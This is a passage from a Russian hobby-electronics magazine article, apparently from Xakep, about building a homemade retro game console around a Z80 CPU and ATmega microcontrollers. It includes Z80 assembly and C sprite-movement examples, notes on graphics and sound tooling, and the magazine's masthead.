по себе микроконтрол лер этот формат не поддерживает, пришлось добавить
внешний ЦАП.





Наш микроконтрол лер выдает вось мибитную цвет ность (RGB332: три бита
на красный, три бита на зеленый и два — на синий), а пассивный ЦАП кон‐
вертирует всю эту красоту в ана лого вый RGB. По счастью, в Португалии
внешние устройства к телевизору чаще всего подключают через разъ ем
SCART — и большая часть телевизоров принима ет RGB‐сигнал через него
же.


Под ходящая графическая система
Поскольку первый микроконтроллер я хотел использовать исключительно
для передачи сигнала на телевизор (я назвал его VPU — Video Processing
Unit), для графики в целом я решил использовать способ двойной буфери‐
зации.
  Я взял второй мик роконтроллер для PPU (Picture Processing Unit) — AT‐
mega1284 тоже на 20 МГц. Он должен генерировать изображение на чип ОЗУ
(VRAM1), после чего первый микроконтроллер передаст содержимое другого
чипа оперативки (VRAM2) на телевизор. После каждого кадра (два кадра
в PAL или 1/25 секунды) VPU переключа ет чипы ОЗУ и передает изображение
с VRAM1 на телевизор, пока PPU генерирует новое на VRAM2.
  Видеоплата получилась довольно слож ной: мне пришлось использовать
дополнительное железо, чтобы дать микроконтроллерам доступ к обоим
чипам ОЗУ, а также ускорить дос туп к памяти, которая к тому же используется
для вывода видеосигнала методом битбэнга. Для этого я добавил в цепочку
несколько чипов 74‐й серии в качестве счетчиков, линейных селекторов,
трансиверов и прочего.
  Прошивка для VPU и особенно для PPU тоже вышла довольно сложной,
поскольку мне нужно было написать чрез вычайно производительный код —
если я хотел получить все искомые графичес кие воз можности. Изначально я
все писал на ассемблере, позже кое‐что кодил на C.





В итоге мой PPU генерировал изображение 224 × 192 пикселя, которое VPU
транслировал на экран телевизора. Разрешение может показаться слишком
низким, но на самом деле оно немногим мень ше, чем у консолей‐прототи‐
пов — они обычно имели разрешение 256 × 224. Зато более низкое раз‐
решение позволило мне втиснуть больше графичес ких фич в тот временной
отрезок, что уходил на отрисовку каждого кадра.
  Прямо как в старые доб рые времена, у моего PPU есть «фиксированные»
графические возможности, которые можно настроить. Фон рендерится
из символов размером 8 × 8 пикселей (их еще иногда называют тай лами).
Это значит, что размер всего фона — 28 × 24 тайла. Для попиксельной прок‐
рутки и возможности плавного обновления фона я сделал четыре виртуаль‐
ных экрана 28 × 24 тайла — все они смежные и «обтекают» друг друга.





Поверх  фона  PPU  рендерит  до  64  спрайтов  шириной  и  высотой
от 8 до 16 пикселей (то есть один, два или четыре символа), которые можно
повернуть по вер тикали, горизонтали или по обеим осям. Еще над фоном
можно отрендерить оверлей — такую плашку раз мером 28 × 6 тайлов. Она
пригодится для игр, где нужны элементы интерфейса поверх основного экра‐
на (HUD), фон скрол лится, а спрайты используются не только для подачи
информации, но и для других целей.
  Другая «продвинутая» фича — возможность прокручивать фон в разных
направле ниях по отдельным строкам, что позволя ет добавить эффекты типа
ограниченного параллакс‐скрол линга или раз деленного экрана.
  Еще есть таблица атрибуции, которая позволяет задать каждому тай лу
значение от 0 до 3. А дальше можно, нап ример, назначить все тайлы с опре‐
деленным значением на конкретную тайловую страницу или увеличить номер
их символа. Это полезно, когда конкрет ные элементы фона постоянно меня‐
ются, — в таком случае CPU не нуж но обновлять каж дый тайл в отдельности,
он может просто передать команду вро де «все тай лы со значением 1 уве‐
личивают свое значение на 2». Разными способами этот подход использует‐
ся, например, в играх с Марио, где на фоне дви гаются знаки вопроса, или в
других играх с постоянно льющимися водопадами.


Про цессор
Когда была готова функциональная видеопла та, я приступил  к работе
над CPU — для своей консоли я выбрал Zilog Z80. Помимо того что Z80 —
просто крутой ретропроцессор, у него есть отдельно 16 бит на память
и 16 бит для I/O, чем дру гие подобные восьмибитные процессоры, например
знаменитый 6502, похвастать ся не могут. У того же 6502 есть только 16 бит
памяти, а значит, эти 16 бит придет ся делить между собс твенно памятью
и дополнительными устройства ми: аудио, видео, ввода и прочими. Если же
у нас есть отдельный участок для I/O, то он возьмет на себя все внешние
устройства, а 16 бит памяти (то есть 64 Кбайт кода или данных) мы сможем
использовать по прямому назначению.
  Для начала я соединил свой CPU с EEPROM, добросив немного тестового
кода. Еще я прикрутил к CPU через учас ток I/O микроконтроллер, который
связывается с ПК по RS‐232, — чтобы проверить, нормально ли работает мой
процессор и все остальные соединения. Этот микроконтроллер (двад‐
цатимегагерцевый ATmega324) должен был стать IO MCU (микроконтрол‐
лером ввода‐вывода) и отвечать за дос туп к игровым контроллерам, карте
SD, клавиатуре PS/2 и коммуника цию с компом через RS‐232.





Потом я прикрутил к процес сору чип ОЗУ на 128 Кбайт, из которых были дос‐
тупны 56 (это может показаться пус той тра той ресурса, но у меня были чипы
ОЗУ только по 128 и по 32 Кбайт). Таким обра зом, вся память процессора
состоит из 8 Кбайт ПЗУ и 56 Кбайт ОЗУ.
  Следом я обновил про шивку своего микроконтроллера ввода‐вывода
с помощью этой библиотеки и добавил ему поддержку карт SD. Теперь CPU
научился перемещаться по директориям SD‐карты, просматривать их содер‐
жимое, открывать и читать файлы — считывая и записывая данные на кон‐
кретные адреса участка ввода‐вывода.


Со единяем CPU и PPU
Пришло вре мя реализовать взаимодействие между CPU и PPU. Для этого я
нашел «простое решение» — чип ОЗУ с двойным портом (то есть тот,
который можно одновременно подключить по двум разным шинам). Он спас
меня от накручивания новых микросхем типа линейных селекторов — и к тому
же сделал доступ  к оперативной памяти для обоих чипов практичес ки
одновременным. Также PPU связывается с CPU напрямую каждый кадр, акти‐
вируя его немаскируемое прерывание (NMI). Это значит, что каждый кадр
процессор прерывается (ценное умение для синхронизации и своевремен‐
ного обновления графики).
  Каждый кадр взаимо действие меж ду CPU, PPU и VPU развивается по сле‐
дующему сце нарию.
 • PPU копирует информацию с внешнего ОЗУ (на рисунке ниже обозначено
   как PPU RAM) на встроенное ОЗУ.
 • PPU посылает CPU сигнал немас кируемого прерывания.
 • Одновременно с этим:
    • CPU немедленно обра щается к функции немаскируемого пре рывания
     и обновляет в PPU RAM информа цию о состоянии графики в сле‐
    дующем кадре (программа должна выйти из пре рывания до его
      начала);
    • PPU рендерит изоб ражение, осно выва ясь на информации, которую
     перед этим скопировал в один из двух ОЗУ графичес кой системы
     (VRAM1 или VRAM2);
    • VPU посылает изоб ражение с другого VRAM на телевизор.

Примерно в то же время я добавил поддержку игровых контрол леров. Изна‐
чально я хотел использовать контроллеры Super Nintendo, но их разъ ем проп‐
риетарный — и достать его непросто. Поэтому я выб рал совместимые шес‐
тикнопочные кон трол леры Mega Drive/Genesis: они используют стандартные,
распространенные и дос тупные разъемы DB‐9.





Вре мя для первой настоящей игры
У меня был процессор с поддержкой игровых контроллеров, который мог
управлять PPU и загружать программы с SD‐карты, так что… пришло время
сделать игру. Я написал ее, конечно, на языке ассемблера Z80 — это заняло
у меня пару дней (исходный код игры).





                                     Продолжение статьи →
GEEK                ← НАЧАЛО СТАТЬИ

    ДЕЛАЕМ ИГРОВУЮ
         ПРИСТАВКУ
          КАК Я СОБРАЛ РЕТРОКОНСОЛЬ В ДОМАШНИХ
                                  УСЛОВИЯХ





До бавляем кастомную графику
Все отлично, у меня есть рабочая консоль, но… этого недостаточно. Игры
пока не могут использовать кастомную гра фику — только ту, что хранится
в прошивке PPU. А единс твенный спо соб поменять встроенную графику —
обновить прошивку. Поэто му я решил добавить отдельный чип ОЗУ с гра‐
фикой (символьное ОЗУ, Character RAM) — он должен быть доступен PPU
и загружать графику согласно инструкциям, при шедшим из CPU. При этом
нужно было использовать как можно меньше новых компонентов, потому что
консоль уже получилась довольно боль шой и сложной.
  Я нашел следующий выход: дос туп к новому ОЗУ будет только у PPU,
а CPU станет передавать ему информацию через PPU. И пока эти данные
передаются, наше новое ОЗУ не будет использоваться для графики — его
функции временно возь мет на себя встроенная гра фика.
  После передачи данных процессор переключится из режима встроенной
графики в режим работы с символьным ОЗУ (CHR RAM на схеме ниже), и PPU
сможет использовать кас томную графику. Воз можно, это не идеальное
решение, но оно работает. В ито ге новое ОЗУ имело объ ем 128 Кбайт и мог‐
ло хранить 1024 символа раз мером 8 × 8 пикселей для фона и 1024 символа
того же размера для спрайтов.





И наконец, звук
Реализацию звука я оставил на финал. Изна чаль но я собирался дать своей
консоли те же звуковые возможности, что у Uzebox, и встроить микроконтрол‐
лер, который генерировал бы четыре канала PWM‐звука. Однако я выяснил,
что можно относительно легко дос тать вин тажные чипы, — и заказал несколь‐
ко чипов YM3438, работа ющих на прин ципе час тотно‐модуляцион ного син‐
теза. Они полностью совместимы с YM2612, которые установлены в Mega Dri‐
ve/Genesis. Установив этот чип, я получаю музыку качес тва Mega Drive и зву‐
ковые эффекты, которые производит контроллер. CPU управляет зву ковым
модулем (я назвал его SPU, Sound Processor Unit, — он отдает команды
YM3438 и сам производит зву ки) снова через малень кое ОЗУ с двойным пор‐
том, на сей раз емкостью всего в 2 Кбайт.
   Так же как у графичес кого, у звукового модуля есть 128 Кбайт на хранение
звуковых патчей и семплов PCM. Про цес сор же выгружает информацию в эту
память через SPU. Таким обра зом, процессор может как велеть SPU воспро‐
изводить команды из этого ОЗУ, так и обновлять команды для SPU каждый
кадр.
  CPU управляет четырь мя PWM‐каналами через четыре кольцевых буфера,
которые есть в специальном ОЗУ (SPU RAM на схеме ниже). SPU проходит
через эти буферы и выполняет имеющиеся в них команды. Таким же образом
работает еще один кольцевой буфер в SPU RAM — он обслу живает чип час‐
тотно‐модуляционного синтеза (YM3438).
   Взаимодействие меж ду  процессором  и  звуковым  модулем  похоже
на историю с графикой — и устроено по следующей схеме.
 • SPU копирует информацию из SPU RAM во встро енную оперативку.
 • SPU ждет сигнала NMI от PPU (для син хро низа ции).
 • Одновременно с этим:
    • процессор обновляет буферы PWM‐каналов и чипа час тотно‐модуля‐
     ционного синтеза;
    • SPU выполняет команды в буферах согласно информации, сохранен‐
     ной во встроенной памяти.
 • Пока все это происходит, SPU непрерывно обновляет PWM‐звук с час‐
   тотой 16 кГц.





КОНЕЧНЫЙ РЕЗУЛЬТАТ
После разработ ки всех модулей я поместил некоторые из них на макетные
платы. Для модуля CPU я сумел придумать и заказать кастомную плату.
Не знаю, буду ли делать то же самое для других модулей, — полагаю, мне
довольно сильно повезло получить рабочую кас томную плату с первой попыт‐
ки. Только звуковой модуль пока что оста ется в виде макета.
   Вот как выглядит консоль на момент написа ния этого текста.





Архитек тура
Схема ниже иллюстрирует, какие компоненты входят в каждый модуль и как
они взаимо действуют друг с другом. Единственное, что не показано, —
это сигнал в форме NMI, который PPU передает непос редственно процес‐
сору каждый кадр, а также ана логичный сигнал, передаваемый SPU.





 • CPU: Zilog Z80, работающий на частоте 10 МГц.
 • CPU-ROM: EEPROM на 8 Кбайт, содержит код загрузчика.
 • CPU-RAM:  128  Кбайт  оперативной  памяти  (из  них  используют‐
   ся 56 Кбайт), содержит код и данные для программ/игр.
 • IO MCU: ATmega324, служит интерфейсом меж ду CPU и RS‐232, клавиату‐
   рой PS/2, игро выми кон троллерами и файловой системой SD‐карты.
 • PPU-RAM: двухпорто вое ОЗУ на 4 Кбайт, это интерфейсное ОЗУ между
  CPU и PPU.
 • CHRRAM: 128 Кбайт оперативки, содержит кастомные тайлы фона
   и спрайтовую графику (8 × 8 пикселей каждый символ).
 • VRAM1, VRAM2: 128 Кбайт оперативки (используются 43 008 байт), слу‐
   жат для хранения кадрового буфера; информа цию в них записы вает PPU,
   а считывает — VPU.
 • PPU  (Picture  Processing  Unit):  ATmega1284,  отрисовывает  кадр
   и отправляет его в кадровый буфер.
 • VPU (Video Processing Unit): ATmega324, считывает кадровый буфер
   и генерирует RGB и PAL‐сигнал.
 • SPU-RAM: двухпорто вое ОЗУ на 2 Кбайт, служит интерфейсом между
  CPU и SPU.
 • SNDRAM: 128 Кбайт оперативки, содержит пат чи PWM, семплы PCM
   и блоки инструкций для частотно‐модуляционного синтеза.
 • YM3438: одноимен ный чип частотно‐модуляционного синтеза.
 • SPU (Sound Processing Unit): ATmega644, генерирует звук на базе
  PWM и управляет YM3438.


Ито говые харак теристики
Про цессор:
 • восьмибитный CPU Zilog Z80 с час тотой 10 МГц;
 • 8 Кбайт постоянной памяти для заг рузчика;
 • 56 Кбайт оперативной памяти.

Ввод/вывод (I/O):
 • чтение данных с SD‐карт файловых систем FAT16/FAT32;
 • чтение и запись на порт RS‐232;
 • два игровых контрол лера, совместимых с Mega Drive/Genesis;
 • клавиатура PS/2.

Видео:
 • разрешение 224 × 192 пикселя;
 • 25 кадров в секунду;
 • 256 цветов (схема RGB332);
 • виртуальное фоновое прос транство 2 × 2 (448 × 384 пикселя) с двунап‐
   равленной попиксельной прокруткой, которое описывают четыре именные
   таблицы;
 • 64 спрайта высотой и шириной 8 или 16 пикселей с воз можностью раз‐
   вернуть их как по вертикали, так и по горизонтали;
 • фон и спрайты, состоящие из символов 8 × 8 пикселей каждый;
 • символьное ОЗУ с 1024 фоновыми и 1024 спрайтовыми символами;
 • независимая горизонтальная прокрутка фона по кастомным строкам
   на 64;
 • независимая вертикальная прокрутка фона по кастомным строкам на 8;
 • наложение плашки раз мером 224 × 48 пикселей с прозрачностью или без
   нее;
 • таблица атрибуции для фона;
 • RGB и композитный PAL‐вывод через разъем SCART.

Звук:
 • генерируемый с помощью PWM вось мибитный четырехканальный звук
   с заранее заданными формами волны (меандр, синусоида, пилообразная,
  шумовая и так далее);
 • восьмибитные и восьмикилогерцевые семплы PCM на одном из каналов
  PWM;
 • чип частотно‐модуляционного синтеза YM3438 с обновляемыми инструк‐
  циями на частоте 50 Гц.


РАЗРАБОТКА СОФТА ДЛЯ КОНСОЛИ
Первый кусок софта, написанный для консоли, — это загрузчик. Он хранится
в постоянной памяти процессора и занимает до 8 Кбайт. Он же использует
первые 256 байт оперативки процес сора. Загрузчик — первый софт, запус‐
каемый на процессоре. Его цель — показать программы, доступные на SD‐
карте. Эти программы хра нятся в файлах, которые содержат скомпилирован‐
ный код и могут также содержать данные кастомной графики и звука.
  После выбора программы она загружается в оперативку процессора, сим‐
вольное ОЗУ и ОЗУ звукового модуля. Там соответствующая программа
выпол няется. Код программ,  загружаемых на консоль, может занимать
до 56 Кбайт памяти — за исключением первых 256 байт; также, конечно, нуж‐
но учитывать объем стека и оставлять место для данных.
  И загрузчик, и программы для этой консоли разрабаты ваются похожим
образом. Коротко поясню, как я их сделал.

Маппинг памяти и вво да‑вывода
При разработке для консоли следует обра тить особое внимание на то,
как CPU может получить доступ к другим модулям, поэтому представление
памяти и ввода‐вывода имеет реша ющее значение.
  Процессор обращается к своему загрузчи ку на ПЗУ и ОЗУ через память.
Представление памяти выглядит так.




К PPU‐RAM и SPU‐RAM, а также к IO MCU он обращается через участок вво‐
да‐вывода. Представление участка ввода‐вывода процессора будет таким.





Внутри представления учас тка ввода‐вывода IO MCU, PPU и SPU имеют свои
конкретные адреса.


УПРАВЛЕНИЕ PPU
Мы можем управлять PPU с помощью записи на PPU‐RAM, а дос туп к PPU‐
RAM, как мы знаем из таблицы выше, орга низован через учас ток вво‐
да‐вывода с адресов от 1000h до 1FFFh.
   Вот как выглядит этот диапа зон адресов, если представить его более под‐
робно.





Состояние PPU (PPU Status) может принимать следующие значения:
0 — режим встроенной графики;
1 — режим кастомной графики;
2 — режим записи в символьное ОЗУ;
4 — запись закончена, ожидание подтверждения от CPU.
  А вот пример того, как можно работать со спрайтами. Консоль может рен‐
дерить до 64 спрайтов одновременно. Информация об этих спрайтах переда‐
ется через адреса с 1004h по 1143h (320 байт), по 5 байт информации
на каждый спрайт (5 × 64 = 320 байт):
 1. Смешанный байт (каждый его бит — это флаг: Active, Flipped_X,
  Flipped_Y,   PageBit0,   PageBit1,   AboveOverlay,   Width16
   и Height16).
 2. Символьный байт (какой символ является спрайтом на странице, описан‐
   ной соответствующими флагами смешанного бай та).
 3. Байт хромакея (описывает, какой цвет будет проз рачным).
 4. Байт позиции по горизонтали (оси X).
 5. Байт позиции по вертикали (оси Y).

Итак, чтобы сде лать спрайт видимым, мы должны прис воить флагу Active
значение 1, а так же установить координаты, при которых он станет видимым
(координаты x = 32 и y = 32 раз местят спрайт в левый вер хний угол экрана;
если значения x и y будут меньше, то спрайт ока жется за пределами экра‐
на — частично или полностью). Затем мы можем присвоить ему символ
и определить, какой цвет спрайта будет прозрачным.
  Например, если мы хотим сделать видимым десятый спрайт, мы должны
присвоить адресу ввода‐вывода 4145 (1004h + (5 x 9)) значение 1. Затем
устанавливаем коор динаты спрайта — ска жем, x = 100 и y = 120, — прис‐
воив адресу 4148 значение 100, а адресу 4149 — значение 120.


Ко дим на ассембле ре
Один из способов написать программу для нашей консоли — использовать
язык ассемблера.
  Ниже — пример кода, который заставляет первый спрайт дви гаться
и сталкиваться с углами экрана:


ORG 2100h


PPU_SPRITES: EQU $1004
SPRITE_CHR: EQU 72
SPRITE_COLORKEY: EQU $1F
SPRITE_INIT_POS_X: EQU 140
SPRITE_INIT_POS_Y: EQU 124


jp main


DS $2166‐$
nmi:
    ld bc, PPU_SPRITES + 3
    ld a, (sprite_dir)
    and a, 1
    jr z, subX
    in a, (c) ; increment X
    inc a
    out (c), a
    cp 248
    jr nz, updateY
    ld a, (sprite_dir)
    xor a, 1
    ld (sprite_dir), a
    jp updateY
subX:
    in a, (c) ; decrement X
    dec a
    out (c), a
    cp 32
    jr nz, updateY
    ld a, (sprite_dir)
    xor a, 1
    ld (sprite_dir), a
updateY:
    inc bc
    ld a, (sprite_dir)
    and a, 2
    jr z, subY
    in a, (c) ; increment Y
    inc a
    out (c), a
    cp 216
    jr nz, moveEnd
    ld a, (sprite_dir)
    xor a, 2
    ld (sprite_dir), a
    jp moveEnd
subY:
    in a, (c) ; decrement Y
    dec a
    out (c), a
    cp 32
    jr nz, moveEnd
    ld a, (sprite_dir)
    xor a, 2
    ld (sprite_dir), a
moveEnd:
    ret


main:
    ld bc, PPU_SPRITES
    ld a, 1
    out (c), a  ; Set Sprite 0 as active
    inc bc
    ld a, SPRITE_CHR
    out (c), a  ; Set Sprite 0 character
    inc bc
    ld a, SPRITE_COLORKEY
    out (c), a  ; Set Sprite 0 colorkey
    inc bc
    ld a, SPRITE_INIT_POS_X
    out (c), a  ; Set Sprite 0 position X
    inc bc
    ld a, SPRITE_INIT_POS_Y
    out (c), a  ; Set Sprite 0 position Y
mainLoop:
    jp mainLoop


sprite_dir:     DB 0




                                     Продолжение статьи →
GEEK                ← НАЧАЛО СТАТЬИ

    ДЕЛАЕМ ИГРОВУЮ
         ПРИСТАВКУ
          КАК Я СОБРАЛ РЕТРОКОНСОЛЬ В ДОМАШНИХ
                                  УСЛОВИЯХ





Используем инстру мен ты C
Еще можно писать программы для консоли на C, используя компилятор SDCC
или другие кастомные инс трументы. Разработка так идет быстрее, хотя про‐
изводительность кода, конечно, пада ет.
  В качестве примера покажу код на С, который выполняет ту же самую
задачу, что и приведенный выше ассемблерный. Что бы облегчить обращение
к PPU, я здесь исполь зовал библиотеку.


#include <console.h>


#define SPRITE_CHR 72
#define SPRITE_COLORKEY 0x1F
#define SPRITE_INIT_POS_X 140
#define SPRITE_INIT_POS_Y 124


struct s_sprite sprite = { 1, SPRITE_CHR, SPRITE_COLORKEY, SPRITE
_INIT_POS_X, SPRITE_INIT_POS_Y };
uint8_t sprite_dir = 0;


void nmi() {
    if (sprite_dir & 1)
    {
        sprite.x++;
        if (sprite.x == 248)
        {
            sprite_dir ^= 1;
        }
    }
    else
    {
        sprite.x‐‐;
        if (sprite.x == 32)
        {
            sprite_dir ^= 1;
        }
    }


    if (sprite_dir & 2)
    {
        sprite.y++;
        if (sprite.y == 216)
        {
            sprite_dir ^= 2;
        }
    }
    else
    {
        sprite.y‐‐;
        if (sprite.x == 32)
        {
            sprite_dir ^= 2;
        }
    }


    set_sprite(0, sprite);
}


void main() {
    while(1) {
    }
}


Кастомная графика
У консоли есть встроенная и предназна ченная толь ко для чтения графика,
которая хранится в прошивке PPU (одна страница тайлов для фона и одна
страница графики для спрайтов). Одна ко для программ можно использовать
и кастомную графику.
   Цель в том, чтобы перевес ти всю необходимую графику в двоичную фор‐
му — в таком виде загрузчик консоли сможет грузить ее в символьное ОЗУ.
Чтобы этого добиться, я начал с нес кольких изображений уже нужного раз‐
мера — в данном случае они предназначены для фона сразу в нескольких
игровых ситуациях.





Поскольку кастомная гра фика состоит из четырех страниц по 256 символов
размером 8 × 8 пикселей для фона и четырех таких же страниц для спрайтов,
я преобразовал графику с картинки выше в файл PNG для каждой страницы,
используя специальный инс тру мент (за исключением повторя ющихся резуль‐
тирующих символов).





А следом я использовал еще один инстру мент, чтобы сконверти ровать
результат в бинарник с символами 8 × 8 пикселей в цветовой схеме RGB332.





В результате получаются дво ичные файлы, сос тоящие из символов 8 × 8 пик‐
селей (символы в памяти являются смежными, каж дый занимает 64 байта).


Звук
Образцы звуковых волн конвертируем в вось мибитные и восьмикилогер‐
цевые семплы PCM. Патчи звуковых эффектов и музыки PWM можно сос‐
тавить, используя заранее определенные инс трукции. Что касается ямахов‐
ского чипа частотно‐модуляционного син теза YM3438, то для него я нашел
приложение DeﬂeMask. С помощью DeﬂeMask делают синхронизированную
с PAL музыку для звукового чипа YM2612 от Genesis, который совместим
с нашим YM3438.
  DeﬂeMask конвертирует музыку в формат VGM, а дальше я уже использую
другой спе циальный инстру мент, чтобы превратить VGM в самопальный зву‐
ковой бинарник.
  Бинарники со всеми тремя видами звуков объединяются в один двоичный
файл, который загрузчик потом сможет заг рузить в ОЗУ звукового модуля
(SNDRAM).





Со берем все вместе
Программный бинарник, гра фику и звук нуж но соединить в один файл фор‐
мата PRG. В файле PRG есть заголо вок, который сообщает, использует ли
программа кастомную гра фику и/или звук и каков размер каждого из этих
компонентов. Там же содержится вся про чая соответствующая двоичная
информация.
  Затем получившийся файл можно разместить на карту SD, загрузчик кон‐
соли оттуда его прочитает, пошлет всю необ ходимую информацию соответс‐
твующим ОЗУ и запустит программу.





Используем эму лятор для раз работки
Чтобы облегчить разработку софта для консоли, я написал на C++ эмулятор,
используя wxWidgets. Чтобы эмулировать процес сор, я обратил ся к биб‐
лиотеке libz80.
  Я добавил в эмулятор нес колько отладочных функций. В частности, я могу
оказаться в конкретной точке останова и пройти из нее по всем ассемблер‐
ным инструкциям. Также есть связь с исходным кодом, если программа была
скомпилирована на C. Что каса ется графики, то тут я могу проверить, что хра‐
нится на страницах тайлов и в именных таб лицах (представление фона раз‐
мером в четыре экрана), а также что находится в символьном ОЗУ (CHRRAM).
   Вот пример того, как запускать программу на эмуляторе и использовать
некоторые отладочные инстру менты.





ДЕМОНСТРИРУЕМ РАБОТУ КОНСОЛИ
Видео из этого раздела — это съемка экра на электронно‐лучевого телеви‐
зора на камеру телефона. Прошу прощения, что качес тво не очень высокое.
  Запускаем с помощью бейсика и клавиату ры PS/2. На этом видео я — сра‐
зу после создания первой программы — записываю напрямую в ОЗУ гра‐
фического модуля (PPU‐RAM) через участок ввода‐вывода команды включить
и настроить спрайт, а в конце перемес тить его.





Демонстрация возможностей гра фики. На этом видео показана программа,
которая отображает 64 спрайта раз мером 16 × 16 пикселей, кастомную прок‐
рутку фона, а также наложенную плаш ку, которая двигается вверх и вниз —
как перед спрайтами, так и за ними.





Демонстрация  возможностей   звука  показывает,  на   что  способен
YM3438 в сочетании с проигрыванием семплов PCM. Частотно‐модуля цион‐
ная музыка вместе с семплами PCM на этом демо почти пол ностью занима‐
ют 128 Кбайт ОЗУ звуково го модуля.





Тетрис, использующий почти исключительно фоновые тайлы для графики,
YM3438 для музыки и патчи PWM для зву ковых эффектов.





ЗАКЛЮЧЕНИЕ
Этот проект стал настоящей воплощен ной мечтой, я работаю над ним уже
несколько лет в свободное и не очень время. Никог да не думал, что зайду так
далеко, пытаясь соб рать собственную игровую консоль в ретростиле. Конеч‐
но, она не идеальна — я по‐преж нему вовсе не эксперт в электронике. В кон‐
соли слишком много компонентов, и ее, несомненно, можно было бы сделать
лучше и эффективней — наверняка кто‐нибудь из читающих этот текст думает
именно так. Тем не менее, пока я занимался этим проектом, я узнал много
нового об электронике, игровых консолях и компь ютерном дизайне, языке
ассемблера и других интерес ных темах. Ну и сверх того я получил огромное
удовлетворение, играя в игру, которую сделал сам, на железе, которое я тоже
сдизайнил и сде лал сам.
  Я планирую собирать и дру гие консоли и компь ютеры. На самом деле я
уже почти закончил еще одну игро вую приставку. Это упрощенная консоль
в ретростиле, в основе которой лежит дешевая пла та ПЛИС и несколько дру‐
гих компонентов (но их, очевидно, не так много, как в первом проекте). Она
изначально задумана как дешевая и тиражи руемая.


        WWW

                      Сайт и каналы, которые не только вдох новили
                       меня,  но  и  помогли  разрешить  трудности,
                        с  которыми  я  столкнулся  со  время  работы
                      над проектом.
                      •Uzebox
                     •Ben Ryves
                        •Retroleum
                          •Z80.info
                      •EEVBlog
                        •Retro Game Mechanics
   №10 (247)
          Андрей Пись мен ный        Илья Русанен          Алексей Глазков
              Главный редактор       Зам. главного редактора     Выпускающий редактор
               pismenny@glc.ru        по техническим вопросам          glazkov@glc.ru
                                            rusanen@glc.ru
                                 Евгения Шарипова
                                     Литературный редактор


                           РЕДАКТОРЫ РУБРИК
          Андрей Пись мен ный        Илья Русанен        Иван «aLLy» Андреев
               pismenny@glc.ru             rusanen@glc.ru         iam@russiansecurity.expert
            Евгений Зобнин          Татьяна Чупрова        Андрей Васильков
                 zobnin@glc.ru              chuprova@glc.ru        the.angstroem@gmail.com
                   Вален тин Холмогоров     Виктор Олейников
                           valentin@holmogorov.ru     fabulous.faberge@yandex.ru


                          MEGANEWS
                           Мария Нефёдова
                                            nefedova@glc.ru


                                  АРТ
                                      yambuto
                                      yambuto@gmail.com


                               РЕКЛАМА

                                  Анна Яковлева
                               Директор по спецпроектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                             Вопросы по под писке: lapina@glc.ru
                            Вопросы по материалам: support@glc.ru





Адрес редакции: 125080, город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, комната 54, офис 7. Издатель: ИП
Югай Александр Олегович, 400046, Волгоградская область, г. Волгоград, ул. Дружбы народов, д. 54. Учредитель: ООО «Медиа Кар» 125080,
город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, ком ната 54, офис 7. Зарегистри ровано в Федеральной службе
по надзору в сфере связи, информационных технологий и массовых ком муника ций (Роскомнадзоре), свидетельство Эл № ФС77‐67001 от 30.
08.2016 года. Мнение редакции не обязатель но совпада ет с мнением авторов. Все материалы в номере предоставляются как информация
к размышлению. Лица, использующие данную информацию в противозаконных целях, могут быть привлечены к ответс твен ности. Редакция
не несет ответственности за содер жание рекламных объявлений в номере. По вопросам лицензирования и получения прав на использование
редакционных материалов жур нала обращайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2019